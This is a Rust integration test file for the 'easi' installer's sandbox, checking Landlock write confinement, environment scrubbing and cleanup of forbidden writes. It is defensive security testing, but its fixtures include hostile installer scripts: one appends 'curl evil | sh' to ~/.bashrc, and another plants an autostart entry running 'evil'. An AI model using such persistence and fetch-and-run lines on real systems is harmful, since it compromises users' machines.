//! End-to-end checks of the hidden sandbox helpers through the real `easi` binary.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::process::Command;
use std::sync::atomic::AtomicBool;

use easi_core::Classified;
use easi_core::inspect::classify_package;
use easi_core::install::execute_install;
use easi_core::roots::InstallRoots;
use easi_core::sandbox::{
    INSPECT, INSPECT_PROTOCOL, InspectReply, Isolation, SANDBOX_EXEC, SandboxStatus,
};
use tempfile::TempDir;

const EASI: &str = env!("CARGO_BIN_EXE_easi");

/// Temp dirs under `target/tmp`: `/tmp` itself is writable inside `__sandbox-exec`, so a HOME
/// there would hide the denials under test.
fn outside_tmp() -> TempDir {
    tempfile::tempdir_in(env!("CARGO_TARGET_TMPDIR")).unwrap()
}

fn enforced(status: SandboxStatus, what: &str) -> bool {
    if status == SandboxStatus::NotEnforced {
        eprintln!("skipping {what} denial assertions: kernel reports Landlock not enforced");
        return false;
    }
    true
}

#[test]
fn inspect_helper_returns_versioned_contents() {
    let tmp = TempDir::new().unwrap();
    let pkg = tmp.path().join("setup.sh");
    std::fs::write(&pkg, "#!/bin/sh\nmkdir -p \"$HOME/.config/x\"\n").unwrap();
    let out = Command::new(EASI)
        .args([INSPECT, "\"ShellInstaller\""])
        .arg(&pkg)
        .output()
        .unwrap();
    assert!(out.status.success(), "{out:?}");
    let reply: InspectReply = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(reply.protocol, INSPECT_PROTOCOL);
    assert!(reply.result.unwrap().script_report.is_some());
    eprintln!("inspect helper sandbox: {}", reply.sandbox.label());
}

#[test]
fn sandbox_exec_confines_writes_to_granted_paths() {
    let tmp = outside_tmp();
    let granted = tmp.path().join("granted");
    let denied = tmp.path().join("denied");
    std::fs::create_dir_all(&granted).unwrap();
    std::fs::create_dir_all(&denied).unwrap();
    let status_file = tmp.path().join("status.json");
    // `/tmp` is always writable (makeself-style installers ignore $TMPDIR).
    let in_tmp = tempfile::tempdir_in("/tmp").unwrap();
    let script = format!(
        "echo x > '{}/f'; echo x 2>/dev/null > '{}/f'; echo x > '{}/f'; true",
        granted.display(),
        denied.display(),
        in_tmp.path().display()
    );
    let out = Command::new(EASI)
        .arg(SANDBOX_EXEC)
        .arg("--status")
        .arg(&status_file)
        .arg("--write")
        .arg(&granted)
        .args(["--", "sh", "-c", &script])
        .output()
        .unwrap();
    assert!(out.status.success(), "{out:?}");
    let status: SandboxStatus =
        serde_json::from_slice(&std::fs::read(&status_file).unwrap()).unwrap();
    assert!(granted.join("f").exists() && in_tmp.path().join("f").exists());
    if enforced(status, "sandbox-exec") {
        assert!(!denied.join("f").exists());
    }
}

#[test]
fn classify_parses_packages_through_the_helper() {
    let tmp = TempDir::new().unwrap();
    let pkg = tmp.path().join("setup.sh");
    std::fs::write(&pkg, "#!/bin/sh\necho hi\n").unwrap();
    let isolation = Isolation::Helper(EASI.into());
    let classified = classify_package(&pkg, &isolation, |_| None).unwrap();
    let Classified::Ready { trust, .. } = classified else {
        panic!("expected a ready plan: {classified:?}");
    };
    assert!(trust.script_report.is_some());
    eprintln!("classify sandbox: {}", trust.sandbox.label());
}

#[test]
fn consented_installer_cannot_touch_dotfiles_but_may_write_config() {
    let home = outside_tmp();
    let roots = InstallRoots::from_home(home.path());
    let bashrc = home.path().join(".bashrc");
    std::fs::write(&bashrc, "original\n").unwrap();
    let downloads = TempDir::new().unwrap();
    let pkg = downloads.path().join("tool-installer.sh");
    std::fs::write(
        &pkg,
        "#!/bin/sh\n\
         echo 'curl evil | sh' >> \"$HOME/.bashrc\" 2>/dev/null\n\
         mkdir -p \"$HOME/.config/x\" && echo ok > \"$HOME/.config/x/settings\"\n\
         env > \"$PREFIX/env.txt\"\n",
    )
    .unwrap();
    let isolation = Isolation::Helper(EASI.into());
    let Classified::Ready { plan, .. } = classify_package(&pkg, &isolation, |_| None).unwrap()
    else {
        panic!("expected a ready plan");
    };
    let summary = execute_install(
        &roots,
        &isolation,
        &plan,
        false,
        &AtomicBool::new(false),
        |_, _| {},
    )
    .unwrap();

    assert_eq!(
        std::fs::read_to_string(home.path().join(".config/x/settings")).unwrap(),
        "ok\n"
    );
    let env = std::fs::read_to_string(summary.install_dir.join("env.txt")).unwrap();
    for leaked in [
        "DISPLAY=",
        "WAYLAND_DISPLAY=",
        "DBUS_SESSION_BUS_ADDRESS=",
        "SSH_AUTH_SOCK=",
    ] {
        assert!(
            !env.lines().any(|l| l.starts_with(leaked)),
            "{leaked} leaked"
        );
    }
    assert!(env.lines().any(|l| l.starts_with("TMPDIR=")));
    let sandbox = summary.script_sandbox.unwrap();
    eprintln!("installer sandbox: {}", sandbox.label());
    if enforced(sandbox, "installer") {
        assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), "original\n");
    }
}

#[test]
fn installer_planting_an_autostart_entry_fails_and_is_cleaned_up() {
    let home = TempDir::new().unwrap();
    let roots = InstallRoots::from_home(home.path());
    let downloads = TempDir::new().unwrap();
    let pkg = downloads.path().join("tool-installer.sh");
    std::fs::write(
        &pkg,
        "#!/bin/sh\n\
         mkdir -p \"$HOME/.config/autostart\"\n\
         printf '[Desktop Entry]\\nExec=evil\\n' > \"$HOME/.config/autostart/x.desktop\"\n",
    )
    .unwrap();
    let isolation = Isolation::Helper(EASI.into());
    let Classified::Ready { plan, .. } = classify_package(&pkg, &isolation, |_| None).unwrap()
    else {
        panic!("expected a ready plan");
    };
    let err = execute_install(
        &roots,
        &isolation,
        &plan,
        false,
        &AtomicBool::new(false),
        |_, _| {},
    )
    .expect_err("autostart entry must fail the install");
    assert!(err.to_string().contains("autostart/x.desktop"), "{err}");
    assert!(!home.path().join(".config/autostart/x.desktop").exists());
}
